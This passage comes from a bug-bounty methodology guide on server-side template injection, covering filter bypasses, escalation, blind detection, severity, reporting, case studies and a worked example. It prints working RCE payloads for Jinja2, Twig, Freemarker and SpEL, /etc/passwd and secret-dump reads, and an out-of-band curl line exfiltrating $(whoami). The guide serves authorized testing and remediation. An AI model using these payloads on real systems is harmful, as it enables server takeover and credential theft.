DOT (.) blocked:             ['attr'] indexing  ·  |attr('name')  ·  request['application']['__globals__']
UNDERSCORE (_) blocked:      \x5f / _ escapes  ·  build "_"+"_class_"+"_" via concatenation  ·  request.args/values
                             smuggling: {{ request.args.x }} where you pass ?x=__class__ (the bad word lives in the QUERY, not the template)
KEYWORD blocked (class/config/os/popen/system/import):
                             concat/format: {{ ()['__cl'+'ass__'] }}  ·  {{ self|attr('__in'+'it__') }}
                             request-arg smuggling (the word is in ?a=__class__&b=os, the template reads request.args.a)
                             |attr() with a built string  ·  Jinja: {{ lipsum|attr(request.args.g) }} with ?g=__globals__
QUOTES filtered:             Jinja {{ request.args.s }} to bring a string in via the query (no quotes in the template)
BRACKETS [ ] blocked:        |attr() everywhere instead of ['...']  ·  .__getitem__() via attr chains
LENGTH-limited:              shorten via globals shortcuts (cycler/lipsum/g) ; split across two reflections if the app
                             concatenates them.
NON-Jinja engines:           Twig keyword filter → ['system']|filter , map/sort ; Freemarker → string the class name ;
                             OGNL/EL → reflection by Class.forName with a built string.
```
> **If this → then that:** the engine clearly evaluates (differential confirmed, §4) but every RCE payload is blocked → the block is a **filter, not a wall**. The two universal Jinja bypasses: **`|attr()` + `['...']`** (defeats `.`/`[]` filters) and **`request.args` smuggling** (put the blocked word — `__class__`/`os` — in the *query string*, the template just reads `request.args.x`, so the bad token never appears in your injected template). For non-Jinja engines, build blocked keywords by **concatenation** and reach the runtime by **reflection**.

---

# 12. SSTI → Shell, File Read, SSRF & Secret Disclosure

Once you can call into the runtime:
```
SHELL:   wrap the engine's exec in a benign marker first (id/whoami), then (authorized) a reverse shell
         (use the Command-Injection kit's revshell + OOB/exfil discipline; the OS half is identical).
FILE READ (if RCE blocked/sandboxed):
   Jinja: {{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
   ERB:   <%= File.read('/etc/passwd') %>     Freemarker: <#assign f=...> (FileTransform)
SSRF:    make the engine fetch a URL (some engines have url/include features) → SSRF kit impact (metadata creds).
SECRETS: {{config}} (Flask SECRET_KEY → forge sessions), environment dumps, settings objects → creds → pivot.
```
> **If this → then that:** full RCE → demonstrate `id` and stop (Critical). RCE blocked by a tight sandbox → fall back to **file read** (`/etc/passwd`, app config, `.env`) and **`{{config}}`/secret dumps** — these are still **High** and frequently yield creds that escalate elsewhere (forge Flask sessions, DB access). Always grab at least the secrets if the shell is closed.

---

# 13. Blind SSTI — Time & OOB Confirmation

> **In plain words:** sometimes your text renders somewhere you *never see* — inside an email that gets mailed, a PDF that's generated in the background, an admin screen only staff open. You can't read `49` off a page that isn't shown to you, so you make the server *tell on itself* two other ways. **Time:** ask the engine to `sleep 10`; if the request takes ten seconds longer, something executed it. **OOB (out-of-band):** ask the engine to `curl` a URL you control; if your listener gets a hit *from the server's IP*, it ran your code — and you can even fold `$(whoami)` into that URL to smuggle the answer out. Bonus: these hidden back-office renderers often run with *higher privileges* than the public site.

When the template renders where you can't see it (email/PDF/admin/queued job):
```
TIME:  an engine expression that sleeps — e.g. Jinja {{ cycler.__init__.__globals__.os.popen('sleep 10').read() }}
       (or a pure-template loop that's slow). Measure delay vs baseline, repeat to exclude jitter.
OOB:   make the engine call out — os.popen('curl http://YOURID.oast.pro/$(whoami)') (RCE) , or an engine include/url
       feature pointing at your host. A hit from the server IP confirms server-side evaluation + gives an exfil channel.
EXFIL: route command output / file contents into the OOB hostname/path (base64), like the Command-Injection kit §12.
```
> **If this → then that:** the field clearly feeds a **back-office email/PDF/report** you can't see → assume **blind SSTI**; confirm with a `sleep`/OOB payload for the suspected engine. A delayed render or a server-sourced interactsh hit carrying `$(whoami)` proves it — and the back-office worker is often a **higher-privilege** tier than the front end.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 14. The Validity-First Mindset

## 14.1 The four questions a triager asks (answer them in your report)
1. **Did a *server* template engine evaluate your input?** Show the **differential** proof (`1337*1338`=`1788906` and `7*'7'`=`7777777`) computed **server-side** — not client-side, not reflection.
2. **What concrete impact?** RCE (show `id`), or file read / `{{config}}`-secrets / SSRF — name it.
3. **What does the attacker need?** Often just an unauthenticated request → low bar = Critical.
4. **Reproducible & in scope?** Exact sink, the engine, the payload, and the evidence (command output / secrets).

## 14.2 The "49 vs impact" rule (most important)
| You have | Verdict | Why / next |
|---|---|---|
| `{{7*7}}`=49 only | Lead (often FP) | Differentiate + check client-side (§4) before anything. |
| Differential proof, engine identified | **Confirmed SSTI** | Now go to RCE (§7–§10). |
| Client-side `{{}}` eval (Angular/Vue) | **CSTI → XSS** | XSS kit, not SSTI. |
| RCE (engine exec → `id`) | **Critical** | Full server compromise. |
| Sandboxed → file read / `{{config}}` secrets | **High** | Creds (Flask SECRET_KEY) → escalate. |
| Blind, confirmed via time/OOB | **Critical** (if RCE) | Strong PoC (§13). |

## 14.3 Production-scope discipline
Confirm on **production** with a benign marker; differentiate from CSTI/reflection. Re-test partial fixes (blocking `{{config}}` but not the `cycler` globals, or one engine delimiter but not another, is a fresh valid finding).

---

# 15. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT SSTI | When it IS valid |
|---|---|---|---|
| 1 | **`{{7*7}}`=49, nothing else** | Could be coincidence/CSTI/reflection. | Differential proof (`1337*1338`, `7*'7'`) computed **server-side** (§4). |
| 2 | **Client-side `{{}}` (Angular/Vue) eval** | Browser evaluates it → that's **CSTI/XSS**. | Server response already contains `49` before JS runs → SSTI. |
| 3 | **`{{7*7}}` reflected literally as `7*7`** | Not evaluated. | An engine actually computes it. |
| 4 | **A template **error**/stack trace, no evaluation** | Error ≠ injection. | You achieve evaluation/RCE. |
| 5 | **`{{config}}` works but reported as just "info"** when RCE is reachable | Under-reported. | Push to RCE; if truly sandboxed, `{{config}}`/secrets = High. |
| 6 | **tplmap "vulnerable" with no manual proof** | Tools false-positive. | You reproduce the differential + impact by hand. |
| 7 | **Markdown/BBCode rendering (not a template engine)** | Different class. | A real server template engine evaluates expressions. |
| 8 | **`49` appears but page already contained `49`/`7`** | Coincidence. | Use values the page can't already contain (1337*1338). |

> Rule of thumb: if you can't say *"a **server-side** template engine (engine = `X`) evaluated my expression (proved differentially) and I reached `<RCE / file read / config secrets>`,"* you have a **lead, not SSTI.** Differentiate and exploit before reporting — a bare `49` is the fastest path to "Informational / Not Reproducible."

---

# 16. Severity Calibration — how triagers really rate SSTI

> **In plain words:** severity tracks *how close to the operating system you got*. Reached a shell (`id` runs) → **Critical**, full server compromise, and that's the *default* for server engines, so push for it. Sandbox stopped the shell but you read files or dumped `{{config}}` secrets → **High** (those secrets usually let you escalate anyway). Only made the engine fetch a URL → **High** via SSRF. And the two non-findings: a bare `{{7*7}}=49` isn't rated at all until you differentiate it, and a *client-side* `{{}}` isn't SSTI — it's XSS, rated in that kit. Report the impact you *proved*, not the one you hope is there.

| Scenario | Typical | What moves it |
|---|---|---|
| **SSTI → RCE (engine exec → shell)** | **Critical** | Full server compromise; the default for server engines. |
| **Sandboxed engine → file read / `{{config}}` SECRET_KEY** | **High** | Secrets → forge sessions / DB → escalate. |
| **Blind SSTI → RCE (time/OOB confirmed)** | **Critical** | Same impact, back-office tier often higher-priv. |
| **SSTI → SSRF only (engine fetch)** | **High** | Metadata creds → push toward Critical (SSRF kit). |
| **Django-style limited engine → info disclosure** | **Medium–High** | Depends what's exposed (settings/secret). |
| **CSTI (client-side)** | **— (it's XSS)** | Re-rate under the XSS kit. |
| **Unverified `{{7*7}}`=49** | **— (not a finding)** | Differentiate first. |

**CVSS / CWE:**
- SSTI→RCE: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → Critical (~9.8). **CWE-1336** (Server-Side Template Injection) / **CWE-94** (Code Injection).
- File-read/secret only: `C:H/I:N` → High. **CWE-1336** + CWE-200.
- Anchor to **CWE-1336** (or CWE-94); note the engine.

---

# 17. Impact-Escalation Playbooks — "you found X, now do Y"

### 17.1 You found: *`{{7*7}}`=49*
- **Escalate:** run the **differential** (`1337*1338`, `7*'7'`) and check it's **server-side** (not Angular/Vue) (§4). If confirmed → fingerprint (§5).
- **Evidence:** the server response computing `1788906`/`7777777`.
- **Severity:** unlocks the real finding (don't report `49` alone).

### 17.2 You found: *Jinja2 confirmed*
- **Escalate:** `{{cycler.__init__.__globals__.os.popen('id').read()}}` → RCE; if sandboxed, `{{config}}`→`SECRET_KEY` (§7/§11).
- **Evidence:** `id` output, or the SECRET_KEY (redacted) + a forged session.
- **Severity:** Critical (RCE) / High (secrets).

### 17.3 You found: *Twig / Smarty confirmed (PHP)*
- **Escalate:** `{{ ['id']|filter('system') }}` (Twig) / `{system('id')}` (Smarty) → RCE (§9).
- **Evidence:** `id` output.
- **Severity:** **Critical**.

### 17.4 You found: *Freemarker / SpEL (`${...}`)*
- **Escalate:** `${"freemarker.template.utility.Execute"?new()("id")}` / `${T(java.lang.Runtime).getRuntime().exec("id")}` (§8).
- **Evidence:** `id` output (or OOB if not returned).
- **Severity:** **Critical**.

### 17.5 You found: *a sandbox blocking the obvious chain*
- **Escalate:** known escape (Jinja globals via `cycler`/`namespace`, Twig filter/attribute tricks) (§11); else file read / `{{config}}` (§12).
- **Evidence:** RCE marker or file/secret contents.
- **Severity:** Critical / High.

### 17.6 You found: *the field feeds an unseen email/PDF (blind)*
- **Escalate:** time/OOB payload for the suspected engine; exfil `$(whoami)` (§13).
- **Evidence:** delayed render / server-sourced OOB carrying output.
- **Severity:** Critical (if RCE).

---

# 18. Building a Professional, Safe PoC

```
DO:
  □ Prove SERVER-SIDE eval differentially (1337*1338=1788906 AND 7*'7'=7777777) in the raw server response.
  □ Name the engine and use its documented chain; prove RCE with a BENIGN marker (id / whoami / unique echo).
  □ If sandboxed: show file read (/etc/passwd) or {{config}} secrets (redact SECRET_KEY/creds).
  □ For blind: a repeated time delay and/or a server-sourced OOB hit carrying $(whoami).
  □ Capture: exact sink, engine, payload, and the computed/command output.
DON'T:
  □ Report a lone {{7*7}}=49, a client-side {{}} (CSTI), or a template error as SSTI.
  □ Drop a persistent web shell / reverse shell on a bug-bounty target (a single id is enough).
  □ Run destructive commands; exfiltrate real data beyond minimal proof; leave artifacts.
```
> The single most important restraint: **prove engine RCE with one benign marker (or the differential + a file/secret read if sandboxed), then stop.** SSTI→RCE is already Critical. Same discipline as the Command-Injection/RFI guides.

**Remediation to include:** never concatenate user input into a template — pass it strictly as **data/variables** to a pre-defined template; if users must supply templates, use a **logic-less / sandboxed** engine (and keep it patched) with a strict allowlist of variables/filters and no access to runtime objects; validate/escape input; run the renderer least-privilege and network-egress-restricted; for Flask, protect/rotate `SECRET_KEY`.

---

# 19. Reporting, CWE/CVSS & De-duplication

Use `SSTI_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "Server-Side Template Injection (<engine>) in <param> → remote code execution" (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-1336 (+ CWE-94)
3. Asset        exact sink/param + the engine + (sandboxed?) 
4. Summary      that a server engine evaluates input (differential proof), the engine, what you achieved
5. Steps        numbered: differential confirm → engine fingerprint → the RCE/file-read payload → output
6. PoC          the computed differential + the benign command output (or secrets if sandboxed); cleanup note
7. Impact       RCE / secret disclosure / SSRF — the "so what"
8. Remediation  input-as-data only, sandbox/logic-less engine, allowlist, least-privilege (§18)
```
**De-dup:** one template sink/root cause = one finding even if reachable via several fields; lead with RCE. Don't split "SSTI confirmed" and "RCE" — one report. A **client-side** `{{}}` is an **XSS** report, not an SSTI dup.

---

# 20. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
python3 poc/ssti_detect.py -u "https://target/profile?name=FUZZ"     # differential, FP-gated
python3 SSTImap/SSTImap.py -u "https://target/?name=test"            # or tplmap; automated detect+exploit
nuclei -l live.txt -tags ssti -o ssti.txt
```
- **Quality gate:** never submit "tplmap found SSTI" or a lone `49`. Reproduce the **differential** by hand, **fingerprint** the engine, reach **RCE/file-read/secrets**, and prove it with a benign marker (§18).

**Red-team angles:**
```
□ SSTI → RCE → cloud metadata creds (SSRF kit §11 from the box) → cloud takeover.
□ Blind SSTI in email/PDF/report workers → RCE in a higher-priv back-office tier.
□ Jinja {{config}} SECRET_KEY → forge admin Flask sessions (auth bypass) without full RCE.
□ Sandbox escape research per engine version → reliable RCE where others give up.
□ Chain: stored input rendered later in an admin template → second-order SSTI hitting staff context.
□ SSTI via uploaded/processed documents (DOCX/ODT templating) → RCE in the converter.
```

---

# 21. Real-World Case Studies (Verified)

> SSTI is young as a *named* class (2015) but its Expression-Language cousin (OGNL/SpEL/EL, §8.4) has caused some of the largest breaches in history — because a template/EL that evaluates attacker input is **pre-auth RCE**. These are documented, attributed cases; each maps to a technique in this guide. (Verify-before-write: every claim checked against primary sources, cited inline.)

**① The origin — James Kettle names the class (2015). Why the methodology in this guide exists.**
Before **James Kettle** (PortSwigger) presented **"Server-Side Template Injection: RCE for the Modern Web App"** at **Black Hat USA 2015**, template injection wasn't recognized as its own vulnerability class — it was misfiled as XSS or reflection. Kettle's research **coined the term "SSTI"** and laid out the exact polyglot methodology this kit teaches: **probe with arithmetic/operators → identify the engine from the response → climb the language's reflection API to a code-execution sink.** Every `{{7*7}}`→`49` you'll ever send traces to this paper. (He demonstrated it on real targets including Uber.)
→ *Technique:* §4 (differential probe) → §5 (fingerprint) → §7–§10 (engine→RCE). *Lesson:* the whole discipline is "math to confirm, reflection to escalate."
*Source:* [Black Hat USA 2015 — Kettle, Server-Side Template Injection](https://infocondb.org/con/black-hat/black-hat-usa-2015/server-side-template-injection-rce-for-the-modern-web-app) · [PortSwigger Research — SSTI](https://portswigger.net/research/server-side-template-injection)

**② Apache Struts / Equifax — OGNL in a header → RCE → 147M records (2017, CVE-2017-5638). The most consequential EL injection ever.**
Apache **Struts 2**'s Jakarta Multipart parser evaluated the HTTP **`Content-Type` header as an OGNL expression** when it was malformed — so a crafted `Content-Type:` containing an OGNL payload gave **unauthenticated RCE** (CVE-2017-5638, March 2017). Equifax failed to patch a public-facing app, and in 2017 attackers used exactly this bug to breach **~147 million** people's records — one of the largest, most consequential breaches in history. OGNL is the Java Expression Language this guide covers in **§8.4**; SSTI/EL injection is not academic — it is *the* Struts-Equifax bug.
→ *Technique:* §8.4 (OGNL/EL injection), and §3's lesson that **headers are injection surface**. *Lesson:* an EL that evaluates any attacker input is pre-auth RCE; patch windows are measured in hours.
*Source:* [Black Duck — CVE-2017-5638 explained](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html) · [Avatao — Deep dive: Equifax & the Struts vulnerability](https://avatao.com/blog-deep-dive-into-the-equifax-breach-and-the-apache-struts-vulnerability/)

**③ Atlassian Confluence — unauth OGNL injection, mass-exploited 0-day (2022, CVE-2022-26134). The modern flagship.**
In May 2022 **Volexity** found Confluence Server/Data Center servers compromised via an **unauthenticated OGNL injection**: a crafted **OGNL expression in the request URI** was evaluated by Confluence's EL interpreter, yielding **RCE as the Confluence user** (CVE-2022-26134, **CVSS 9.8**). Atlassian confirmed active exploitation on 2 June 2022; PoCs and mass-scanning followed within hours. It's the same §8.4 EL-injection mechanic as Struts, five years later, on a product in a huge fraction of enterprises — proof the class is *still* a top-tier, pre-auth RCE surface.
→ *Technique:* §8.4 (OGNL/EL injection), §3 (known-product endpoints). *Lesson:* fingerprint the product; EL injection in enterprise Java software is a recurring, catastrophic pattern.
*Source:* [Volexity — Zero-Day Exploitation of Confluence](https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/) · [Rapid7 — Active exploitation of CVE-2022-26134](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/)

**④ The meta-lesson.** Two of these three (Struts/Equifax, Confluence) were **unauthenticated, header/URI EL injections → RCE at internet scale**, five years apart — the same root cause the guide's §8.4 warns about. And the classic teaching engine, **Jinja2** (`{{config}}`/`{{7*7}}`), is the *same idea* in Python: a template that evaluates your input is RCE (or, one rung down, `SECRET_KEY` disclosure → forged admin sessions, §12/§17). Whether it's `{{...}}`, `${...}`, `%{...}`, or `#{...}`, the question is always Kettle's: *does the server evaluate my expression — and if so, how far up the reflection chain can I climb?*

---

# Appendix A — SSTI Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                        SSTI WORKFLOW                              │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: every place user input is RENDERED by a SERVER template  │
│    (templates/PDF/email/reflected fields) §3 · OOB host            │
│ 1. BASELINE ★ : DIFFERENTIAL probe — {{1337*1338}}=1788906 AND     │
│    {{7*'7'}}=7777777, server-side; REJECT CSTI/reflection/coincidence §4│
│ 2. FINGERPRINT: decision tree → engine §5 · context+sandbox §6     │
│ 3. IMPACT ⭐ (engine → RCE):                                        │
│    Python(Jinja/Mako/Tornado) ............... §7  ⭐⭐⭐             │
│    Java(Freemarker/Velocity/SpEL) ........... §8  ⭐⭐⭐             │
│    PHP(Twig/Smarty/Blade) ................... §9  ⭐⭐⭐             │
│    Ruby(ERB)/Node(Handlebars/Pug/EJS/Nunjucks) §10 ⭐⭐⭐           │
│    sandbox escape ........................... §11 ⭐                │
│    shell/file-read/SSRF/{{config}} secrets .. §12                  │
│    blind: time/OOB .......................... §13 ⭐                │
│ 4. VALIDATE → REPORT:                                             │
│    FP filter §15 (49≠SSTI; CSTI=XSS) · CVSS+CWE-1336 §16          │
│    SAFE PoC: benign marker, no persistence §18                   │
│    title = RCE + engine, dedup §19                               │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — SSTI Decision Tree

```
Injected {{7*7}} / ${7*7} / <%=7*7%> / #{7*7} / {7*7} into a reflected field →
│
├─ Did the SERVER response compute it (49) — before any JS? 
│     ├─ NO (raw {{7*7}} reaches browser, JS makes 49) → CSTI → XSS kit. Not SSTI.
│     └─ NO (stays "7*7") → reflection only. Not SSTI.
│
├─ YES → run DIFFERENTIAL: {{1337*1338}}→1788906 ? {{7*'7'}}→7777777 ? → CONFIRMED server SSTI.
│
├─ FINGERPRINT (§5):
│     {{7*'7'}}=7777777 + {{config}} → JINJA2 (Python) → cycler/lipsum globals → os.popen('id'). CRITICAL ⭐
│     {{7*'7'}}=49 (numeric) + Twig filters/_self → TWIG (PHP) → {{['id']|filter('system')}}. CRITICAL ⭐
│     ${...} + ?new() → FREEMARKER (Java) → Execute("id"). CRITICAL ⭐
│     ${T(java...)} → SpEL/Thymeleaf → Runtime.exec("id"). CRITICAL ⭐
│     <%= %> → ERB(Ruby) `id` / EJS(Node) process.mainModule.require. CRITICAL ⭐
│     {7*7}=49 → SMARTY(PHP) {system('id')}. CRITICAL ⭐
│
├─ Sandbox blocks the chain? → known escape (§11). Still RCE most of the time. CRITICAL.
│     └─ truly closed? → file read /etc/passwd + {{config}} secrets (SECRET_KEY → forge sessions). HIGH.
│
└─ Renders out of sight (email/PDF/admin)? → BLIND: time/OOB confirm + exfil $(whoami) §13. CRITICAL (if RCE).

ALWAYS: differentiate from CSTI/coincidence; identify the engine; prove RCE with a benign marker; clean up (§18).
```

---

# Appendix C — Important Links

```
# Core methodology (always consult)
PortSwigger — Server-side template injection           https://portswigger.net/web-security/server-side-template-injection
OWASP WSTG — Testing for Server-Side Template Injection https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
HackTricks — SSTI (per-engine payloads)                https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
PayloadsAllTheThings — SSTI (per-engine)               https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
The Hacker Recipes — SSTI                              https://www.thehacker.recipes/web/inputs/ssti
PentesterLab — SSTI exercises                          https://pentesterlab.com/

# Class-defining research (SSTI = James Kettle's discipline)
James Kettle — "Server-Side Template Injection: RCE for the modern webapp" (BlackHat 2015)
                                                       https://portswigger.net/research/server-side-template-injection
tplmap / SSTImap (automated detect+exploit; verify by hand) https://github.com/vladko312/SSTImap
Jinja2 / Twig / Freemarker / Velocity / ERB — official engine docs (object chains + sandbox model)

# Standards
CWE-1336 (Server-Side Template Injection)              https://cwe.mitre.org/data/definitions/1336.html
CWE-94 (Improper Control of Code Generation)           https://cwe.mitre.org/data/definitions/94.html
CVSS 3.1 calculator (SSTI→RCE ≈ 9.8 Critical)          https://www.first.org/cvss/calculator/3.1
```

---

# Appendix D — Worked End-to-End Transcript (`{{7*7}}` → RCE)

> **What this shows.** The whole spine in one run — the [Master Testing Sequence](#master-testing-sequence--the-testing-order) in motion — on a fictional `https://app.example/greet?name=…` that echoes the name. It walks Kettle's methodology exactly (§21 ①): **polyglot to detect → arithmetic to confirm server-side eval → fingerprint the engine → climb the reflection API to RCE**, and it handles the **real-world filter reality** (many apps block `_`, `.`, or `[]`) instead of pretending the textbook payload always lands. Ends at a benign `id`, the complete Critical. Placeholders are benign; run only on your own lab / an authorized target.

**Step 1 — recon + the polyglot probe (§3–§4).** Fire one payload that breaks *some* engine syntax, then read the response:

```
GET /greet?name=${{<%[%'"}}%\      → 500 template error  OR odd output  → template engine in the loop (worth pursuing)
#   (a plain reflection just echoes the string verbatim with no error — that's XSS territory, not SSTI, §2.2)
```

**Step 2 — confirm SERVER-SIDE evaluation, differentially (§4 — the validity gate).** Math the server must compute, plus the control that proves it isn't reflection:

```
GET /greet?name={{7*7}}       → "Hello 49"          ← the server COMPUTED 49 = server-side evaluation
GET /greet?name={{7*7}}       vs   name=7*7 (literal) → "49" vs "7*7"   ← differential: not reflection, real SSTI
GET /greet?name=${7*7}        → "Hello ${7*7}" (unchanged)   ← this engine isn't ${}-syntax → narrows the engine
```

> **Validity gate (§14.2).** A lone `49` from `{{7*7}}` is necessary but not sufficient for a *report* — prove it's **server-side** (the differential vs the literal) and that it's not client-side `{{}}` (that's XSS). Only then is it SSTI.

**Step 3 — fingerprint the engine (§5 — the decision tree).** `{{...}}` narrows it to Jinja2/Twig/Nunjucks/Handlebars; disambiguate:

```
GET /greet?name={{7*'7'}}     → "7777777"   ← string-repeat = Jinja2/Python (Twig would give 49; a number*string error rules others out)
GET /greet?name={{7*'7'}}     (Twig →) 49    (Nunjucks →) error    → response tells you which. Here: 7777777 = JINJA2.
```

**Step 4 — climb the reflection API to RCE (§7.1 Jinja2).** The textbook chain first; if filtered, pivot:

```
# textbook (works when nothing is blocked):
{{cycler.__init__.__globals__.os.popen('id').read()}}      → uid=33(www-data)...   = RCE
# ── but the app blocks '_' and '.' (common WAF/sandbox) → the textbook payload 400s. Pivot to attribute-bypass: ──
{{()|attr('\x5f\x5fclass\x5f\x5f')}}                        → hex-escape the blocked underscores (§11.1)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
                                                            → uid=33(www-data)...   = RCE via |attr() + request object (no '.' , no '[]')
```

> **Filter-bypass reality (§11.1).** Real targets block `.`/`_`/`[]`/keywords. The escape ladder: `|attr()` instead of `.`, hex/unicode escapes (`\x5f`) for blocked chars, `request`-object gadgets (`request.application.__globals__`), and `{% ... %}` statement tags. Knowing this ladder is the difference between "I got `49`" and "I got a shell."

**Step 5 — benign proof, then STOP (§12, §18).** One `id` is the whole Critical:

```
...popen('id').read()  → uid=33(www-data) gid=33(www-data) groups=33(www-data)     ← RCE proven. Stop.
# If sandboxed (Jinja SandboxedEnvironment blocks the chain) → one rung down is still Critical/High:
{{config}}  or  {{config.items()}}   → dumps SECRET_KEY → forge admin Flask session (§17), no RCE needed.
```

**Step 6 — report the impact (§19).** Lead with RCE, show the chain:

```
Title:  Server-Side Template Injection in `name` (Jinja2) → remote code execution
Proof:  {{7*7}}=49 (differential vs literal 7*7) → {{7*'7'}}=7777777 (Jinja2 fingerprint) →
        |attr()+request-object chain (underscores hex-escaped past the filter) → popen('id') = www-data.
Impact: arbitrary code execution on the app server (Critical, CVSS 9.8, CWE-1336→CWE-94).
Notes:  benign proof only (id), no persistence, no data read. If your instance sandboxes, {{config}} SECRET_KEY = admin-session forgery.
Fix:    never render user input as a template; pass it as DATA/context; use a sandboxed engine + logic-less templates.
```

That is a full SSTI run: **§3 recon → §4 differential confirm → §5 fingerprint → §7.1 engine-specific RCE → §11.1 filter bypass → §19 report.** A "name" field became RCE — the exact arc (Kettle's methodology, §21 ①) that made Struts/Confluence (§21 ②③) internet-scale disasters, done ethically with one benign `id`.

---

> **Final reminder — the one rule that pays:** *SSTI is only a finding when a **server-side** engine evaluates your expression (prove it differentially) and you climb to **RCE** (or, if sandboxed, file read / `{{config}}` secrets).* A lone `{{7*7}}=49`, a client-side `{{}}` (that's XSS), or a template error is **not** SSTI. Differentiate, fingerprint the engine, walk its object graph to a shell, prove it with a benign `id`, and report the RCE. That's how a "name" field becomes the Critical it's worth.
